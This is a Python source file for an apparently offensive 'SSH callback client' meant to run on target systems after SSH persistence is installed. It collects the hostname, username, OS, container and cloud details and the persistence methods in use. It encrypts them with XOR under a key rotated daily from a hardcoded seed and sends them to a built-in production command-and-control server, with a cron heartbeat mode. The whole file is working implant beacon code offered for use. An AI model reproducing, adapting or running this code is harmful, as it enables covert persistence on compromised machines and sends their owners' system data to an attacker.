#!/usr/bin/env python3
"""
POLYGOTTEM SSH Callback Client (Encrypted)
============================================
Client script to send encrypted callbacks from SSH persistence installations

Features:
- XOR encryption with DGA-derived keys
- Time-based key rotation (24h default)
- Production server: https://polygotya.swordintelligence.airforce
- Fallback to urllib if requests unavailable

Usage:
    # Basic callback (encrypted)
    python3 client_callback.py --api-key YOUR_KEY

    # With auto-detection
    python3 client_callback.py --api-key YOUR_KEY --auto-detect

    # Heartbeat mode (for cron)
    python3 client_callback.py --api-key YOUR_KEY --heartbeat

    # Custom server
    python3 client_callback.py --server https://custom-server.com --api-key YOUR_KEY

Author: SWORDIntel
Date: 2025-11-18
Version: 2.0 (Encrypted)
"""

import sys
import json
import socket
import platform
import subprocess
import argparse
import hashlib
import base64
from pathlib import Path
from datetime import datetime, timedelta

# Try to import requests, fallback to urllib
try:
    import requests
    USE_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    USE_REQUESTS = False


# === EMBEDDED ENCRYPTION MODULE ===
# Embedded to avoid dependencies on target systems

class DGAKeyDerivation:
    """DGA-based key derivation (embedded)"""

    def __init__(self, seed="insovietrussiawehackyou"):
        self.seed = seed

    def generate_rotating_key(self, rotation_hours=24, algorithm="sha256", key_length=32):
        """Generate key that rotates every N hours"""
        now = datetime.utcnow()
        hours_since_epoch = int(now.timestamp() / 3600)
        period_start_hours = (hours_since_epoch // rotation_hours) * rotation_hours
        period_start = datetime.utcfromtimestamp(period_start_hours * 3600)

        date_str = period_start.strftime("%Y-%m-%d")
        hash_input = f"{self.seed}:{date_str}".encode('utf-8')

        if algorithm == "sha512":
            hash_obj = hashlib.sha512(hash_input)
        elif algorithm == "md5":
            hash_obj = hashlib.md5(hash_input)
        else:
            hash_obj = hashlib.sha256(hash_input)

        key_material = hash_obj.digest()

        # Extend key if needed
        while len(key_material) < key_length:
            hash_obj = hashlib.sha256(key_material + hash_input)
            key_material += hash_obj.digest()

        return key_material[:key_length]


class XORCipher:
    """XOR cipher (embedded)"""

    def __init__(self, key):
        if not key:
            raise ValueError("Encryption key cannot be empty")
        self.key = key

    def encrypt(self, plaintext):
        """Encrypt plaintext using XOR"""
        plaintext_bytes = plaintext.encode('utf-8')
        ciphertext_bytes = self._xor_bytes(plaintext_bytes)
        return base64.b64encode(ciphertext_bytes).decode('ascii')

    def _xor_bytes(self, data):
        """XOR data with key"""
        key_length = len(self.key)
        return bytes([data[i] ^ self.key[i % key_length] for i in range(len(data))])


def encrypt_data(data_str, seed="insovietrussiawehackyou"):
    """Encrypt data with DGA-derived key"""
    dga = DGAKeyDerivation(seed)
    key = dga.generate_rotating_key(rotation_hours=24, algorithm="sha256")
    cipher = XORCipher(key)
    return cipher.encrypt(data_str)


# === END ENCRYPTION MODULE ===


def get_hostname():
    """Get system hostname"""
    try:
        return socket.gethostname()
    except:
        return "unknown"


def get_username():
    """Get current username"""
    try:
        import os
        return os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
    except:
        return "unknown"


def detect_environment():
    """Detect environment information"""
    env_data = {
        'hostname': get_hostname(),
        'username': get_username(),
        'ssh_port': 22,  # Default, override if needed
        'os_type': 'unknown',
        'os_version': 'unknown',
        'architecture': platform.machine(),
        'environment': 'unknown',
        'init_system': 'unknown',
        'ssh_implementation': 'unknown',
        'persistence_methods': []
    }

    # Detect OS
    system = platform.system().lower()
    if 'linux' in system:
        env_data['os_type'] = 'linux'
        env_data['os_version'] = platform.version()

        # Detect distribution
        if Path('/etc/os-release').exists():
            try:
                with open('/etc/os-release') as f:
                    for line in f:
                        if line.startswith('PRETTY_NAME='):
                            env_data['os_version'] = line.split('=')[1].strip('"\'')
                            break
            except:
                pass

        # Detect init system
        if Path('/run/systemd/system').exists():
            env_data['init_system'] = 'systemd'
        elif Path('/sbin/openrc').exists():
            env_data['init_system'] = 'openrc'
        elif Path('/run/runit').exists():
            env_data['init_system'] = 'runit'

        # Detect SSH implementation
        if Path('/usr/sbin/sshd').exists():
            env_data['ssh_implementation'] = 'openssh'
        elif Path('/usr/sbin/dropbear').exists():
            env_data['ssh_implementation'] = 'dropbear'

        # Detect environment type
        if Path('/.dockerenv').exists():
            env_data['environment'] = 'docker'
        elif Path('/proc/1/cgroup').exists():
            try:
                with open('/proc/1/cgroup') as f:
                    content = f.read()
                    if 'docker' in content:
                        env_data['environment'] = 'docker'
                    elif 'lxc' in content:
                        env_data['environment'] = 'lxc'
            except:
                pass

        # Check for cloud
        if Path('/sys/hypervisor/uuid').exists():
            try:
                with open('/sys/hypervisor/uuid') as f:
                    if 'ec2' in f.read().lower():
                        env_data['environment'] = 'aws_ec2'
            except:
                pass

    elif 'windows' in system:
        env_data['os_type'] = 'windows'
        env_data['os_version'] = platform.version()
        env_data['init_system'] = 'windows_service'

        # Check for OpenSSH
        if Path(r'C:\Windows\System32\OpenSSH\sshd.exe').exists():
            env_data['ssh_implementation'] = 'openssh_windows'

    elif 'darwin' in system:
        env_data['os_type'] = 'macos'
        env_data['os_version'] = platform.mac_ver()[0]
        env_data['init_system'] = 'launchd'

    return env_data


def send_callback_requests(server_url, api_key, env_data, encrypt=True, seed="insovietrussiawehackyou"):
    """Send callback using requests library (with encryption)"""
    url = f"{server_url}/api/register"

    payload = {
        'api_key': api_key,
        **env_data
    }

    try:
        if encrypt:
            # Encrypt the entire payload (except API key)
            data_to_encrypt = json.dumps({k: v for k, v in env_data.items()})
            encrypted_data = encrypt_data(data_to_encrypt, seed)

            # Send encrypted payload with API key
            encrypted_payload = {
                'api_key': api_key,
                'encrypted': True,
                'data': encrypted_data
            }

            response = requests.post(url, json=encrypted_payload, timeout=30, verify=True)
        else:
            # Send unencrypted (legacy mode)
            response = requests.post(url, json=payload, timeout=30, verify=True)

        return response.status_code, response.json()
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def send_callback_urllib(server_url, api_key, env_data, encrypt=True, seed="insovietrussiawehackyou"):
    """Send callback using urllib (fallback, with encryption)"""
    url = f"{server_url}/api/register"

    payload = {
        'api_key': api_key,
        **env_data
    }

    try:
        if encrypt:
            # Encrypt the entire payload (except API key)
            data_to_encrypt = json.dumps({k: v for k, v in env_data.items()})
            encrypted_data = encrypt_data(data_to_encrypt, seed)

            # Send encrypted payload with API key
            encrypted_payload = {
                'api_key': api_key,
                'encrypted': True,
                'data': encrypted_data
            }

            data = json.dumps(encrypted_payload).encode('utf-8')
        else:
            # Send unencrypted (legacy mode)
            data = json.dumps(payload).encode('utf-8')

        req = urllib.request.Request(
            url,
            data=data,
            headers={'Content-Type': 'application/json'}
        )

        response = urllib.request.urlopen(req, timeout=30)
        status_code = response.getcode()
        response_data = json.loads(response.read().decode('utf-8'))
        return status_code, response_data
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def send_heartbeat_requests(server_url, api_key, hostname):
    """Send heartbeat using requests library"""
    url = f"{server_url}/api/heartbeat"

    payload = {
        'api_key': api_key,
        'hostname': hostname
    }

    try:
        response = requests.post(url, json=payload, timeout=30, verify=True)
        return response.status_code, response.json()
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def send_heartbeat_urllib(server_url, api_key, hostname):
    """Send heartbeat using urllib (fallback)"""
    url = f"{server_url}/api/heartbeat"

    payload = {
        'api_key': api_key,
        'hostname': hostname
    }

    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        url,
        data=data,
        headers={'Content-Type': 'application/json'}
    )

    try:
        response = urllib.request.urlopen(req, timeout=30)
        status_code = response.getcode()
        response_data = json.loads(response.read().decode('utf-8'))
        return status_code, response_data
    except Exception as e:
        return None, {'status': 'error', 'message': str(e)}


def main():
    parser = argparse.ArgumentParser(
        description='POLYGOTTEM SSH Callback Client (Encrypted)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send encrypted callback with auto-detection (production server)
  python3 client_callback.py --api-key abc123 --auto-detect

  # Send encrypted callback to custom server
  python3 client_callback.py --server https://custom.example.com --api-key abc123 --auto-detect

  # Send callback with manual data
  python3 client_callback.py --api-key abc123 \\
      --hostname myserver --os-type linux --ssh-port 22

  # Send heartbeat (for periodic checks)
  python3 client_callback.py --api-key abc123 --heartbeat

  # Disable encryption (legacy mode)
  python3 client_callback.py --api-key abc123 --auto-detect --no-encrypt

  # Use with SSH persistence module
  python3 ssh_persistence_linux_enhanced.py --install-all --callback-api-key abc123

Production Server: https://polygotya.swordintelligence.airforce
        """
    )

    parser.add_argument('--server',
                       default='https://polygotya.swordintelligence.airforce',
                       help='Callback server URL (default: production server)')
    parser.add_argument('--api-key', required=True, help='API key for authentication')
    parser.add_argument('--auto-detect', action='store_true', help='Auto-detect environment')
    parser.add_argument('--heartbeat', action='store_true', help='Send heartbeat instead of full callback')
    parser.add_argument('--no-encrypt', action='store_true', help='Disable encryption (legacy mode)')
    parser.add_argument('--seed', default='insovietrussiawehackyou',
                       help='DGA seed for encryption (default: insovietrussiawehackyou)')

    # Manual environment data
    parser.add_argument('--hostname', help='Hostname')
    parser.add_argument('--username', help='Username')
    parser.add_argument('--ssh-port', type=int, default=22, help='SSH port')
    parser.add_argument('--os-type', help='OS type (linux/windows/macos)')
    parser.add_argument('--os-version', help='OS version')
    parser.add_argument('--architecture', help='Architecture')
    parser.add_argument('--environment', help='Environment type')
    parser.add_argument('--init-system', help='Init system')
    parser.add_argument('--ssh-implementation', help='SSH implementation')
    parser.add_argument('--persistence-methods', nargs='+', help='Persistence methods used')

    args = parser.parse_args()

    # Heartbeat mode
    if args.heartbeat:
        hostname = args.hostname or get_hostname()
        print(f"[*] Sending heartbeat for {hostname}...")

        if USE_REQUESTS:
            status_code, response_data = send_heartbeat_requests(args.server, args.api_key, hostname)
        else:
            status_code, response_data = send_heartbeat_urllib(args.server, args.api_key, hostname)

        if status_code == 200:
            print(f"[+] Heartbeat sent successfully")
            print(f"[*] Response: {response_data.get('message')}")
            return 0
        else:
            print(f"[!] Failed to send heartbeat: {response_data.get('message')}")
            return 1

    # Full callback mode
    if args.auto_detect:
        print("[*] Auto-detecting environment...")
        env_data = detect_environment()
        print(f"[+] Detected: {env_data['os_type']} {env_data['os_version']}")
    else:
        # Use manual data
        env_data = {
            'hostname': args.hostname or get_hostname(),
            'username': args.username or get_username(),
            'ssh_port': args.ssh_port,
            'os_type': args.os_type or 'unknown',
            'os_version': args.os_version or 'unknown',
            'architecture': args.architecture or platform.machine(),
            'environment': args.environment or 'unknown',
            'init_system': args.init_system or 'unknown',
            'ssh_implementation': args.ssh_implementation or 'unknown',
            'persistence_methods': args.persistence_methods or []
        }

    # Encryption settings
    use_encryption = not args.no_encrypt

    print(f"[*] Server: {args.server}")
    print(f"[*] Encryption: {'ENABLED (XOR + DGA)' if use_encryption else 'DISABLED (legacy mode)'}")
    print(f"[*] Sending callback...")

    if USE_REQUESTS:
        status_code, response_data = send_callback_requests(
            args.server, args.api_key, env_data,
            encrypt=use_encryption, seed=args.seed
        )
    else:
        status_code, response_data = send_callback_urllib(
            args.server, args.api_key, env_data,
            encrypt=use_encryption, seed=args.seed
        )

    if status_code == 200:
        print(f"[+] Callback registered successfully")
        print(f"[*] Callback ID: {response_data.get('callback_id')}")
        print(f"[*] Timestamp: {response_data.get('timestamp')}")
        return 0
    else:
        print(f"[!] Failed to register callback: {response_data.get('message')}")
        return 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
